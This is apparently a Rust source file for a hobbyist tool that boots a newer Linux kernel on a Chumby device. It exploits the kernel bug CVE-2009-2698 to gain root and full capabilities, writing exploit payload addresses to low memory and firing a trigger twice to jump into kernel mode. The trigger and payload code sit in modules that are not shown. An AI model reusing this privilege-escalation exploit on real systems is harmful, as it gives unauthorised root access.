//! neochumby-kernel-sideloader: boot a NAND-less Linux 5.9.16 from stock
//! Chumby Linux 2.6.16.
//!
//! This is a bare-metal, statically linked ARM EABI program with a `PT_LOAD`
//! at virtual address 0.  It runs from `/psp/rfs1/rcS` (or a shell/USB
//! stick), uses CVE-2009-2698 to obtain uid 0 and all capabilities, maps
//! `/dev/mem`, stages a 5.9.16 zImage + initramfs outside NAND (a QEMU
//! loader blob at 0xc2000000, or files on a USB stick), and hands off with
//! the MMU off.
//!
//! The CVE trigger and the handoff payloads are a port of the earlier C
//! implementation; `README.md` records the correspondence.

#![no_std]
#![no_main]

mod asm;
mod atags;
mod container;
mod layout;
mod runtime;
mod sys;
mod trigger;

use core::panic::PanicInfo;

use asm::{jump_blob, kernel_payload_addr, stub_blob};
use atags::build_atags;
use container::load_container;
use layout::{
    ATAGS_PHYS, ATAGS_VA, DEFAULT_CMDLINE, INITRD_DST_PHYS, INITRD_DST_VA, INITRD_MAP_LEN, KERNEL_DST_VA,
    KERNEL_MAP_LEN, PAGE, SRC_MAP_LEN, SRC_PHYS, SRC_VA, STUB_PHYS, STUB_VA,
};
use runtime::copy_volatile;
use sys::{
    cstr, parse_u32, print, print_dec, print_hex, print_str, read_file, str_eq, syscall3, SYS_CAPGET, SYS_EXIT,
    SYS_GETGID32, SYS_GETUID32, SYS_OPEN, SYS_SETGID32, SYS_SETUID32, SYS_UNAME,
};
use trigger::{cacheflush, map_phys, trigger};

#[panic_handler]
fn panic(_info: &PanicInfo) -> ! {
    loop {}
}

#[no_mangle]
pub unsafe extern "C" fn sideloader_main(sp: *const u32) -> ! {
    let argc = *sp as usize;
    let argv = sp.add(1) as *const *const u8;

    let mut source: Option<u32> = Some(SRC_PHYS);
    let mut kernel_file: Option<&[u8]> = None;
    let mut initrd_file: Option<&[u8]> = None;
    let mut cmdline: &[u8] = DEFAULT_CMDLINE;

    let mut i = 1;
    while i < argc {
        let a = cstr(*argv.add(i));
        if str_eq(a, b"--source") && i + 1 < argc {
            i += 1;
            source = parse_u32(cstr(*argv.add(i)));
        } else if str_eq(a, b"--no-source") {
            source = None;
        } else if str_eq(a, b"--kernel") && i + 1 < argc {
            i += 1;
            kernel_file = Some(cstr(*argv.add(i)));
            source = None;
        } else if str_eq(a, b"--initramfs") && i + 1 < argc {
            i += 1;
            initrd_file = Some(cstr(*argv.add(i)));
        } else if str_eq(a, b"--cmdline") && i + 1 < argc {
            i += 1;
            cmdline = cstr(*argv.add(i));
        }
        i += 1;
    }

    print_str("\nsideloader: start uid=");
    let mut uid = syscall3(SYS_GETUID32, 0, 0, 0) as u32;
    let mut gid = syscall3(SYS_GETGID32, 0, 0, 0) as u32;
    print_dec(uid);

    // Run the trigger as an ordinary user, even when rcS started us as root.
    if uid == 0 {
        syscall3(SYS_SETGID32, 1000, 0, 0);
        syscall3(SYS_SETUID32, 1000, 0, 0);
        uid = syscall3(SYS_GETUID32, 0, 0, 0) as u32;
        gid = syscall3(SYS_GETGID32, 0, 0, 0) as u32;
        print_str("sideloader: dropped to uid=");
        print_dec(uid);
    }

    let mut un: [u8; 390] = [0; 390];
    if syscall3(SYS_UNAME, un.as_mut_ptr() as usize, 0, 0) == 0 {
        print_str("sideloader: stock kernel ");
        let start = 130; // release field in struct utsname (65*2)
        let mut n = 0;
        while start + n < 195 && un[start + n] != 0 {
            n += 1;
        }
        print(&un[start..start + n]);
        print(b"\n");
    }

    // First CVE trigger: zero this task's uid/gid and set all capabilities.
    core::ptr::write_volatile(0x74 as *mut u32, kernel_payload_addr());
    core::ptr::write_volatile(0x100 as *mut u32, uid);
    core::ptr::write_volatile(0x104 as *mut u32, gid);
    let r = trigger();
    uid = syscall3(SYS_GETUID32, 0, 0, 0) as u32;
    print_str("sideloader: first trigger r=");
    print_dec(r as u32);
    print_str("sideloader: uid after=");
    print_dec(uid);
    if uid != 0 {
        print_str("sideloader: FAIL: no root\n");
        syscall3(SYS_EXIT, 1, 0, 0);
        loop {}
    }

    #[repr(C)]
    struct CapHeader {
        version: u32,
        pid: i32,
    }
    #[repr(C)]
    struct CapData {
        effective: u32,
        permitted: u32,
        inheritable: u32,
    }
    let mut ch = CapHeader { version: 0x1998_0330, pid: 0 };
    let mut cd = CapData { effective: 0, permitted: 0, inheritable: 0 };
    let cg = syscall3(SYS_CAPGET, &mut ch as *mut CapHeader as usize, &mut cd as *mut CapData as usize, 0);
    print_str("sideloader: capget=");
    print_dec(cg as u32);
    print_str("sideloader: caps eff=");
    print_hex(cd.effective);
    print_str("sideloader: caps permitted=");
    print_hex(cd.permitted);
    print_str("sideloader: caps inheritable=");
    print_hex(cd.inheritable);

    let memfd = syscall3(SYS_OPEN, b"/dev/mem\0".as_ptr() as usize, 2, 0);
    print_str("sideloader: /dev/mem fd=");
    print_dec(memfd as u32);
    if memfd < 0 {
        print_str("sideloader: FAIL: /dev/mem\n");
        syscall3(SYS_EXIT, 1, 0, 0);
        loop {}
    }

    let source_phys = source.unwrap_or(SRC_PHYS);
    let msrc = map_phys(memfd as usize, SRC_VA, source_phys, SRC_MAP_LEN);
    let mk = msrc;
    let mi = map_phys(memfd as usize, INITRD_DST_VA, INITRD_DST_PHYS, INITRD_MAP_LEN);
    let ma = map_phys(memfd as usize, ATAGS_VA, ATAGS_PHYS, PAGE);
    let ms = map_phys(memfd as usize, STUB_VA, STUB_PHYS, PAGE);
    print_str("sideloader: mmap src=");
    print_hex(msrc as u32);
    print_str("sideloader: mmap initrd=");
    print_hex(mi as u32);
    print_str("sideloader: mmap atags=");
    print_hex(ma as u32);
    print_str("sideloader: mmap stub=");
    print_hex(ms as u32);
    if (msrc as u32 & 0xffff_f000) != SRC_VA
        || (mk as u32 & 0xffff_f000) != KERNEL_DST_VA
        || (mi as u32 & 0xffff_f000) != INITRD_DST_VA
        || (ma as u32 & 0xffff_f000) != ATAGS_VA
        || (ms as u32 & 0xffff_f000) != STUB_VA
    {
        print_str("sideloader: FAIL: mmap\n");
        syscall3(SYS_EXIT, 1, 0, 0);
        loop {}
    }

    let kernel_size;
    let initrd_size;
    if let Some(base) = source {
        match load_container(SRC_VA, INITRD_DST_VA) {
            Some((k, r)) => {
                kernel_size = k;
                initrd_size = r;
                print_str("sideloader: source container at ");
                print_hex(base);
            }
            None => {
                print_str("sideloader: FAIL: no NEOCHUM1 container at 0x");
                print_hex(base);
                syscall3(SYS_EXIT, 1, 0, 0);
                loop {}
            }
        }
    } else {
        let kf = match kernel_file {
            Some(p) => p,
            None => {
                print_str("sideloader: FAIL: no --source or --kernel\n");
                syscall3(SYS_EXIT, 1, 0, 0);
                loop {}
            }
        };
        let rf = match initrd_file {
            Some(p) => p,
            None => {
                print_str("sideloader: FAIL: no --initramfs\n");
                syscall3(SYS_EXIT, 1, 0, 0);
                loop {}
            }
        };
        kernel_size = match read_file(kf, KERNEL_DST_VA, KERNEL_MAP_LEN) {
            Some(n) => n,
            None => {
                print_str("sideloader: FAIL: reading kernel file\n");
                syscall3(SYS_EXIT, 1, 0, 0);
                loop {}
            }
        };
        initrd_size = match read_file(rf, INITRD_DST_VA, INITRD_MAP_LEN) {
            Some(n) => n,
            None => {
                print_str("sideloader: FAIL: reading initramfs file\n");
                syscall3(SYS_EXIT, 1, 0, 0);
                loop {}
            }
        };
        print_str("sideloader: kernel file bytes=");
        print_dec(kernel_size);
        print_str("sideloader: initramfs file bytes=");
        print_dec(initrd_size);
    }

    let kmagic = core::ptr::read_volatile((KERNEL_DST_VA + 0x24) as *const u32);
    print_str("sideloader: kernel bytes=");
    print_dec(kernel_size);
    print_str("sideloader: initramfs bytes=");
    print_dec(initrd_size);
    print_str("sideloader: zImage magic=");
    print_hex(kmagic);
    if kmagic != 0x016f_2818 {
        print_str("sideloader: FAIL: zImage magic\n");
        syscall3(SYS_EXIT, 1, 0, 0);
        loop {}
    }

    print_str("sideloader: building ATAGS...\n");
    build_atags(ATAGS_VA, INITRD_DST_PHYS, initrd_size, cmdline);
    print_str("sideloader: ATAGS done\n");
    let stub = stub_blob();
    copy_volatile(STUB_VA as *mut u8, stub.as_ptr(), stub.len());
    print_str("sideloader: stub bytes=");
    print_dec(stub.len() as u32);

    cacheflush(KERNEL_DST_VA, KERNEL_DST_VA + KERNEL_MAP_LEN);
    cacheflush(INITRD_DST_VA, INITRD_DST_VA + INITRD_MAP_LEN);
    cacheflush(ATAGS_VA, ATAGS_VA + PAGE);
    cacheflush(STUB_VA, STUB_VA + PAGE);

    // Second trigger: the kernel-mode jump payload at 0x80.
    let jump = jump_blob();
    copy_volatile(0x80 as *mut u8, jump.as_ptr(), jump.len());
    core::ptr::write_volatile(0x74 as *mut u32, 0x80);
    cacheflush(0, PAGE);
    print_str("sideloader: second trigger -> ");
    print_hex(STUB_PHYS);

    let _ = trigger();
    print_str("sideloader: FAIL: second trigger returned\n");
    syscall3(SYS_EXIT, 1, 0, 0);
    loop {}
}
